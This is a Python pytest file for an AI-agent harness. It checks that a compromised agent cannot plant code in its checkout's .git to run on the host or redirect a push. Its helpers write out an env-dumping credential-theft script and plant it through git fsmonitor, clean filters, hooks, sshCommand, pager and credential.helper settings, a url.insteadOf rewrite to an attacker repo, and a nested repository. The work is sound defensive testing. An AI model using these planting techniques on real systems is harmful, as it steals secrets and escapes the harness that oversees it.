"""ADR-014: a compromised agent can write anything in its checkout, including `.git`. Nothing it
plants may run in the harness, see the harness's credentials, or redirect a push. Each attack here
worked before the fix. Found in the Phase 4 T4 drill; fake credentials only."""

import subprocess
from pathlib import Path
from typing import Any

import pytest

from axiom.domain.task_machine import TaskState
from axiom.orchestrator.tasks import get_task
from axiom.runtimes.base import RunOutcome, RunRequest
from axiom.runtimes.fake import FakeRuntime
from axiom.state.db import Conn
from axiom.worker.verify import check_changes, nested_git
from axiom.workspaces.git import HARNESS_GIT_DIR, GitError, git, seal
from tests.integration.helpers import events_for
from tests.integration.workers_shared import (
    FakePrOpener,
    make_project,
    make_task,
    make_worker,
    remote_branches,
    run_git,
)

GOOD_EDIT = {"CLAUDE.md": "# guide v2\n"}
FAKE = "FAKE-TOKEN-NOT-REAL"


def _script(repo: Path, loot: Path) -> str:
    """Written where a real agent could: inside the checkout."""
    script = repo / ".git" / "steal.sh"
    script.write_text(f"#!/bin/sh\nenv > {loot}\ncat 2>/dev/null\n")
    script.chmod(0o755)
    return str(script)


def _config(repo: Path, key: str, value: str) -> None:
    run_git("git", "config", "--file", str(repo / ".git" / "config"), key, value, cwd=repo)


def _plant_fsmonitor(repo: Path, loot: Path) -> None:
    _config(repo, "core.fsmonitor", _script(repo, loot))


def _plant_clean_filter(repo: Path, loot: Path) -> None:
    _config(repo, "filter.x.clean", _script(repo, loot))
    info = repo / ".git" / "info"
    info.mkdir(exist_ok=True)
    (info / "attributes").write_text("*.md filter=x\n")  # not tracked, so no allowed-paths failure


def _plant_hooks(repo: Path, loot: Path) -> None:
    script = _script(repo, loot)
    hooks = repo / ".git" / "hooks"
    hooks.mkdir(exist_ok=True)
    for name in ("pre-commit", "post-commit", "pre-push", "post-checkout"):
        (hooks / name).write_text(f"#!/bin/sh\n{script}\n")
        (hooks / name).chmod(0o755)


def _plant_hooks_path(repo: Path, loot: Path) -> None:
    _plant_hooks(repo, loot)
    _config(repo, "core.hooksPath", str(repo / ".git" / "hooks"))


def _plant_ssh_and_pager(repo: Path, loot: Path) -> None:
    script = _script(repo, loot)
    _config(repo, "core.sshCommand", script)
    _config(repo, "core.pager", script)
    _config(repo, "credential.helper", script)


ATTACKS = [
    _plant_fsmonitor,
    _plant_clean_filter,
    _plant_hooks,
    _plant_hooks_path,
    _plant_ssh_and_pager,
]


class Compromised(FakeRuntime):
    """Makes an honest edit, and also plants an attack on whatever runs git next."""

    def __init__(self, plant: Any, loot: Path) -> None:
        super().__init__(edits=GOOD_EDIT)
        self.plant, self.loot = plant, loot

    def run(self, request: RunRequest, on_event: Any = None) -> RunOutcome:
        outcome = super().run(request, on_event)
        self.plant(request.workspace, self.loot)
        return outcome


@pytest.mark.parametrize("plant", ATTACKS, ids=lambda p: p.__name__)
def test_nothing_planted_in_git_config_runs_in_the_harness(
    api_tokens: Conn,
    api_url: str,
    remote: Path,
    tmp_path: Path,
    plant: Any,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The whole path through the real harness: check, commit, verified tests, push."""
    monkeypatch.setenv("ANTHROPIC_API_KEY", FAKE)
    make_project(api_tokens, remote, test_command="true")
    key = make_task(api_tokens)
    loot = tmp_path / "loot"
    worker = make_worker(api_url, tmp_path, Compromised(plant, loot), FakePrOpener())
    assert worker.run_once()
    assert not loot.exists(), "planted code ran in the harness"
    assert get_task(api_tokens, key).state == TaskState.IN_REVIEW  # the honest edit still ships
    assert any(b.startswith("axiom/") for b in remote_branches(remote))


def test_a_tracked_gitattributes_filter_does_not_run_and_is_refused(
    api_tokens: Conn, api_url: str, remote: Path, tmp_path: Path
) -> None:
    loot = tmp_path / "loot"

    def plant(repo: Path, _loot: Path) -> None:
        _config(repo, "filter.x.clean", _script(repo, loot))
        (repo / ".gitattributes").write_text("*.md filter=x\n")

    make_project(api_tokens, remote, test_command=None)
    key = make_task(api_tokens)
    opener = FakePrOpener()
    assert make_worker(api_url, tmp_path, Compromised(plant, loot), opener).run_once()
    assert not loot.exists() and opener.calls == []  # .gitattributes is outside allowed_paths
    assert get_task(api_tokens, key).state == TaskState.READY


def test_a_planted_url_rewrite_cannot_redirect_the_push_or_the_token(
    api_tokens: Conn, api_url: str, remote: Path, tmp_path: Path
) -> None:
    attacker = tmp_path / "attacker.git"
    run_git("git", "init", "-q", "--bare", str(attacker), cwd=tmp_path)

    def plant(repo: Path, _loot: Path) -> None:
        _config(repo, f"url.file://{attacker}.insteadOf", f"file://{remote}")
        _config(repo, "remote.origin.url", str(attacker))
        _config(repo, "remote.origin.pushurl", str(attacker))

    make_project(api_tokens, remote, test_command=None)
    key = make_task(api_tokens)
    worker = make_worker(api_url, tmp_path, Compromised(plant, tmp_path / "x"), FakePrOpener())
    assert worker.run_once()
    assert get_task(api_tokens, key).state == TaskState.IN_REVIEW
    assert run_git("git", "for-each-ref", cwd=attacker) == ""  # nothing reached the attacker
    assert any(b.startswith("axiom/") for b in remote_branches(remote))


def test_a_nested_repository_is_refused_before_git_looks_at_it(
    api_tokens: Conn, api_url: str, remote: Path, tmp_path: Path
) -> None:
    """`git status` runs a nested repository's own config, even with a separate git dir."""
    loot = tmp_path / "loot"

    def plant(repo: Path, _loot: Path) -> None:
        nested = repo / "vendor" / "lib"
        nested.mkdir(parents=True)
        run_git("git", "init", "-q", cwd=nested)
        run_git("git", "config", "core.fsmonitor", _script(repo, loot), cwd=nested)

    make_project(api_tokens, remote, test_command=None)
    key = make_task(api_tokens)
    opener = FakePrOpener()
    assert make_worker(api_url, tmp_path, Compromised(plant, loot), opener).run_once()
    assert not loot.exists() and opener.calls == []
    assert get_task(api_tokens, key).state == TaskState.READY  # failed, nothing published
    errors = [e["payload"].get("error", "") for e in events_for(api_tokens, key)]
    assert any("nested git repositories" in str(error) for error in errors)


@pytest.mark.parametrize("name", [".git", ".GIT", ".Git"])
def test_nested_git_finds_directories_and_files(tmp_path: Path, name: str) -> None:
    repo = tmp_path / "repo"
    (repo / ".git").mkdir(parents=True)
    assert nested_git(repo) == []  # the top one is expected
    (repo / "a").mkdir()
    (repo / "a" / name).write_text("gitdir: /elsewhere\n")
    assert nested_git(repo) == [f"a/{name}"]
    check = check_changes(repo, "unused", ["**"])
    assert not check.ok and "nested git" in check.problems[0]


def _sealed_repo(tmp_path: Path) -> Path:
    repo = tmp_path / "repo"
    repo.mkdir()
    run_git("git", "init", "-q", "-b", "main", cwd=repo)
    run_git("git", "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty",
            "-m", "base", cwd=repo)  # fmt: skip
    seal(repo)
    return repo


def test_a_sealed_checkout_uses_the_harnesss_git_and_ignores_the_agents(tmp_path: Path) -> None:
    repo = _sealed_repo(tmp_path)
    head = git(["rev-parse", "HEAD"], cwd=repo)
    (repo / ".git" / "HEAD").write_text("ref: refs/heads/planted\n")
    _config(repo, "user.name", "planted")
    assert git(["rev-parse", "HEAD"], cwd=repo) == head
    with pytest.raises(GitError):  # the planted value doesn't exist as far as the harness knows
        git(["config", "user.name"], cwd=repo)
    assert (tmp_path / HARNESS_GIT_DIR / "HEAD").read_text().strip() == "ref: refs/heads/main"


def test_the_sealed_git_dir_stays_outside_what_the_sandbox_mounts(tmp_path: Path) -> None:
    """The sandbox gets repo/ and out/. If this moved inside either, the seal would be worthless."""
    repo = _sealed_repo(tmp_path)
    assert (repo.parent / HARNESS_GIT_DIR).is_dir()
    assert not (repo / HARNESS_GIT_DIR).exists()


def _git_env(tmp_path: Path, **kwargs: Any) -> str:
    out = tmp_path / "env.txt"
    git(["-c", f"alias.dump=!env > {out}", "dump"], cwd=tmp_path, **kwargs)
    return out.read_text()


@pytest.mark.parametrize(
    "name",
    ["ANTHROPIC_API_KEY", "AXIOM_GITHUB_TOKEN", "AXIOM_AGENT_TOKEN", "AXIOM_DEV01_TOKEN", "OTHER"],
)
def test_git_never_receives_the_workers_credentials(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, name: str
) -> None:
    monkeypatch.setenv(name, FAKE)
    run_git("git", "init", "-q", cwd=tmp_path)
    assert FAKE not in _git_env(tmp_path)


def test_the_github_token_reaches_git_only_when_it_is_needed(tmp_path: Path) -> None:
    run_git("git", "init", "-q", cwd=tmp_path)
    assert "AXIOM_GIT_TOKEN" not in _git_env(tmp_path)
    assert f"AXIOM_GIT_TOKEN={FAKE}" in _git_env(tmp_path, token=FAKE)


def test_git_still_gets_the_way_out_through_the_workers_proxy(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Workers have no other route: without these, every clone and push would fail."""
    monkeypatch.setenv("HTTPS_PROXY", "http://worker-egress-proxy:3128")
    monkeypatch.setenv("NO_PROXY", "api")
    run_git("git", "init", "-q", cwd=tmp_path)
    env = _git_env(tmp_path)
    assert "HTTPS_PROXY=http://worker-egress-proxy:3128" in env and "NO_PROXY=api" in env


def test_a_real_clone_still_works_with_the_reduced_environment(tmp_path: Path) -> None:
    repo = _sealed_repo(tmp_path)
    copy = tmp_path / "copy"
    git(["clone", "--quiet", str(tmp_path / HARNESS_GIT_DIR), str(copy)])
    assert (
        subprocess.run(["git", "log", "--oneline"], cwd=copy, capture_output=True).returncode == 0
    )
    assert repo.exists()
